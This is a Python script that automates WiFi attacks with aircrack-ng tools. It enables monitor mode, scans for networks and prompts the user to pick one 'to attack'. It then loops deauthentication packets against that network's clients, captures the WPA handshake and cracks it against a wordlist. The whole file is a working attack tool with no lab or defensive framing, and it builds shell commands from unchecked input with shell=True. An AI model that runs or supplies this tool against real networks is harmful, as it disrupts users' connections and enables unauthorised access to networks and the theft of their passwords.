import subprocess
import time
import argparse
import csv
import psutil
import os
import threading


def execute_command(command):
    print(f"Executing command: {command}")
    process = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if stdout:
        print(stdout.decode())
    if stderr:
        print(stderr.decode())
    return process.returncode


def enable_monitor_mode(interface):
    print("Enabling monitor mode on interface:", interface)
    execute_command(f"sudo ifconfig {interface} down")
    execute_command(f"sudo iwconfig {interface} mode monitor")
    execute_command(f"sudo ifconfig {interface} up")
    print("Monitor mode enabled.")


def disable_monitor_mode(interface):
    print("Disabling monitor mode on interface:", interface)
    execute_command(f"sudo ifconfig {interface} down")
    execute_command(f"sudo iwconfig {interface} mode managed")
    execute_command(f"sudo ifconfig {interface} up")
    print("Monitor mode disabled.")


def set_interface_channel(interface, channel):
    print(f"Setting interface {interface} to channel {channel}...")
    execute_command(f"sudo iwconfig {interface} channel {channel}")
    print(f"Interface {interface} set to channel {channel}.")


def scan_networks(interface, scan_duration=15):
    print(
        f"Scanning for networks on interface {interface} for {scan_duration} seconds...")
    airodump_proc = subprocess.Popen(
        f"sudo airodump-ng {interface} -w scan_results --output-format csv", shell=True)
    time.sleep(scan_duration)
    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()
        print("Force killed airodump-ng")
    # Ensure all child processes are killed
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'airodump-ng':
            proc.kill()
    print("Network scan complete.")


def parse_scan_results(file_name='scan_results-01.csv'):
    print(f"Parsing scan results from {file_name}...")
    networks = []
    with open(file_name, 'r') as file:
        reader = csv.reader(file)
        for row in reader:
            if len(row) > 14 and row[0] != 'BSSID':
                networks.append({
                    'bssid': row[0],
                    'channel': row[3],
                    'ssid': row[13].strip()
                })
    print(f"Found {len(networks)} networks.")
    return networks


def capture_handshake(interface, bssid, channel, output_file, capture_duration=60):
    print(
        f"Capturing handshake on BSSID {bssid} on channel {channel} for {capture_duration} seconds...")

    airodump_proc = subprocess.Popen(
        f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}", shell=True)

    time.sleep(capture_duration)
    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()
        print("Force killed airodump-ng")
    # Ensure all child processes are killed
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'airodump-ng':
            proc.kill()
    print("Handshake capture complete.")


def deauth_clients(interface, bssid, count=10, delay=0.1):
    print(
        f"Deauthenticating clients from BSSID {bssid} with {count} packets...")
    for i in range(count):
        execute_command(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
        time.sleep(delay)
    print("Deauthentication complete.")


def deauth_loop(interface, bssid, delay=0.1, stop_event=None):
    print(f"Starting deauth loop for BSSID {bssid}...")
    while not stop_event.is_set():
        execute_command(f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}")
        time.sleep(delay)


def verify_handshake(capture_file, wordlist):
    if not os.path.isfile(wordlist):
        print(f"Wordlist file not found: {wordlist}")
        return False

    print(
        f"Verifying handshake in file {capture_file} using wordlist {wordlist}...")

    command = ["aircrack-ng", capture_file, "-w", wordlist]
    print(f"Running command: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
    if "KEY FOUND!" in result.stdout:
        print("Handshake successfully cracked!")
        return True
    elif "No valid WPA handshakes found" in result.stdout:
        print("No valid handshake found.")
    elif "EAPOL" in result.stdout:
        print("EAPOL data found but handshake could not be cracked.")
    else:
        print("Handshake found but could not be cracked. Verify if the password is in the wordlist and the capture is complete.")
    return False


def remove_existing_files():
    execute_command("rm -f scan*")
    execute_command("rm -f output*")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Automate Aircrack-ng tools to capture and crack WiFi handshakes.")
    parser.add_argument(
        "interface", help="Wireless network interface (e.g., wlan0)")
    parser.add_argument(
        "output_file", help="Output file for captured handshake")
    parser.add_argument(
        "wordlist", help="Path to the wordlist for cracking the handshake")
    parser.add_argument(
        "--scan_duration", help="Duration to scan for networks (default: 15 seconds)", type=int, default=15)
    parser.add_argument(
        "--capture_duration", help="Duration to capture handshakes (default: 60 seconds)", type=int, default=60)
    parser.add_argument(
        "--deauth_count", help="Number of deauthentication packets to send (default: 10)", type=int, default=10)
    parser.add_argument(
        "--deauth_delay", help="Delay between deauthentication packets in seconds (default: 0.1)", type=float, default=0.1)

    args = parser.parse_args()

    try:
        # Remove existing files
        remove_existing_files()

        enable_monitor_mode(args.interface)
        scan_networks(args.interface, args.scan_duration)

        networks = parse_scan_results()
        if not networks:
            print("No networks found.")
            exit(1)

        print("Found networks:")
        for idx, network in enumerate(networks):
            print(
                f"{idx}: BSSID: {network['bssid']}, Channel: {network['channel']}, SSID: {network['ssid']}")

        target_idx = int(input("Select the network to attack (index): "))
        target_bssid = networks[target_idx]['bssid']
        target_channel = networks[target_idx]['channel']

        # Continuous deauth and capture until a handshake is found
        handshake_captured = False
        stop_event = threading.Event()
        while not handshake_captured:
            print("Capturing handshake...")
            # Ensure monitor mode is enabled
            enable_monitor_mode(args.interface)
            # Set the interface to the target channel
            set_interface_channel(args.interface, target_channel)

            # Start capturing handshake in a separate thread
            capture_thread = threading.Thread(target=capture_handshake, args=(
                args.interface, target_bssid, target_channel, args.output_file, args.capture_duration))
            capture_thread.start()

            # Start deauth loop in a separate thread
            deauth_thread = threading.Thread(target=deauth_loop, args=(
                args.interface, target_bssid, args.deauth_delay, stop_event))
            deauth_thread.start()

            # Wait for the capture thread to finish
            capture_thread.join()

            # Verify the captured handshake
            handshake_captured = verify_handshake(
                args.output_file + "-01.cap", args.wordlist)
            if handshake_captured:
                print("Valid handshake captured and cracked.")
                stop_event.set()
                deauth_thread.join()
            else:
                print("No valid handshake captured, retrying...")

    except KeyboardInterrupt:
        print("\nScript interrupted by user.")
        stop_event.set()
        deauth_thread.join()

    finally:
        disable_monitor_mode(args.interface)
        print("Script execution complete.")
